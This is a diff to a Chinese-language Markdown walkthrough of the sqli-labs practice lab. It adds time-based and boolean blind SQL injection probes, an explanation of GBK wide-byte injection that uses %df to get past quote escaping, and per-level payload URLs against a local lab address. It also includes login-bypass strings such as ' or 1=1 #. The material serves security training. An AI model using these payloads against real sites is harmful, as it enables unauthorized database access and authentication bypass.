@@ -1,5 +1,24 @@
 # SQLI
 
+## 判断sql注入的语句
+
+1. `and sleep(2)`
+    > If(ascii(substr(database(),1,1))>115,0,sleep(5))%#
+2. `and if(1=1,1,1)=1`
+    > 正常执行的话，等于1正常返回，其他数值报错。这是一个类似三元运算符的东西。算式成立返回第一个值，否则返回第二个值
+3. `if(1=(select 1 REGEXP if(1=1,1,0x00)),1,1)=1`
+    > REGEXP 是模糊查询。这样执行`select 2 REGEXP 2;`,会返回
+4. `left(user(),1)="r"`
+    > 查询用户名的第一个字母
+
+```mysql
+暂时还没测试成功的......有没有路过的野生大神讲解一下。。。
+IFNULL(ascii(substr(user(),1,1))/(114%ascii(substr (user(),1,1))),'yes’)
+IFNULL(hex(substr(user(),1,1))/(114%hex(substr(u ser(),1,1))),'yes’)
+IFNULL(1/(locate(substr(user(),1,1),'r')),'yes’)
+IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),' yes’)
+```
+
 ## 第一关
 
 上来就是一课，注意数值查询注入和字符注入。
@@ -86,6 +105,11 @@
     5:database()     返回当前数据库名
     6:version()      返回当前数据库版本信息
     7:load_file()    返回文件的内容
+
+    substr(string string,num start,num length);
+    string为字符串；
+    start为起始位置；
+    length为长度。
    ```
 
 ## 第六关
@@ -201,6 +225,7 @@
     url编码对照：
     %23    #
     %26    &
+    %27    '
     %a0    空格
     %0b    TAB键（垂直）     可以代替空格
     %09    TAB 键（水平）    可以代替空格
@@ -267,12 +292,83 @@
 
 1. 注入语句 `http://192.168.3.148/Less-31/?id=1%") and sleep(5) and ("1"="1`
 
+## 宽字节注入
+
+- 原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’
+因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：
+
+1. `%df` 吃掉 \ 具体的原因是 urlencode('\) =%5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
+2. 将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass的一种方法。
+
+## 第三十二关
+
+1. 利用宽字节注入，再单引号前加`%df`吃掉转意的`/`，注入语句如后。 `http://192.168.3.148/Less-32/?id=1%df%27%20and%20sleep(5)%20--+`
+    > `http://192.168.3.148/Less-32/?id=1%df' and sleep(5) --+`
+
+## 第三十三关
+
+1. 本关使用的payload与上关相同，用`%df`吃掉`/`即可. `http://192.168.3.148/Less-33/?id=1%df%27%20and%20sleep(5)--+`
+
+## 第三十四关
+
+1. 注入语句 `uname=admin%df' or 1=1  #`
+
+## 第三十五
+
+1. `http://192.168.3.148/Less-35/?id=1%20and%20sleep(5)`
+    > `http://192.168.3.148/Less-35/?id=1 and sleep(5)`
+
+## 第三十六关
+
+1. `http://192.168.3.148/Less-36/?id=1%df%27%20and%20sleep(5)--+`
+    > `http://192.168.3.148/Less-36/?id=1%df' and sleep(5)--+`
+
+## 第三十七关
+
+1. `uname=admin%df' or 1=1 #&passwd=123456&submit=Submit`
+    > `uname=admin%df' or 1=1 #&passwd=123456&submit=Submit`
+
+## 第三十八关
+
+1. `http://192.168.3.148/Less-38/?id=1%27and%20sleep(5)--+`
+    > `http://192.168.3.148/Less-38/?id=1'and sleep(5)--+`
+
+## 第三十九关
+
+1. `http://192.168.3.148/Less-39/?id=1%20and%20sleep(5)`
+    > `http://192.168.3.148/Less-39/?id=1 and sleep(5)`
+
+## 第四十关
+
+1. `http://192.168.3.148/Less-40/?id=1%27%20and%20if(1=1,1,1)=1%20and%20%271%27=%271`
+    > `http://192.168.3.148/Less-40/?id=1' and if(1=1,1,1)=1 and '1'='1`
+
+## 第四十一关
+
+1. `http://192.168.3.148/Less-41/?id=1 and sleep(5)`
+
+## 第四十二关
+
+1. 登陆处密码进行注入 `login_user=admin&login_password=123456'or 1=1 -- &mysubmit=Login`
+
+## 第四十三关
+
+1. 思路和上关基本相同 `gin_user=admin&login_password=123456' or '1'= '1&mysubmit=Login`
+
+## 第四十四关
+
+1. `login_user=admin&login_password=123456' or '1'='1&mysubmit=Login`
+
+## 第四十五关
+
+1. `login_user=admin&login_password=123456' or '1'='1&mysubmit=Login`
+
 ## 感谢以下博文的原作者
 
-> https://blog.csdn.net/sdb5858874/article/details/80727555  
+> **https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf**  
+https://blog.csdn.net/sdb5858874/article/details/80727555  
 https://blog.csdn.net/alex_seo/article/details/82148955  
 https://blog.csdn.net/qq_34444097/article/details/83043678  
 https://blog.csdn.net/qq_28295425/article/details/78905978  
 https://blog.csdn.net/u012763794/article/details/51361152  
 https://www.cnblogs.com/AmoBlogs/p/8683218.html  
-https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf
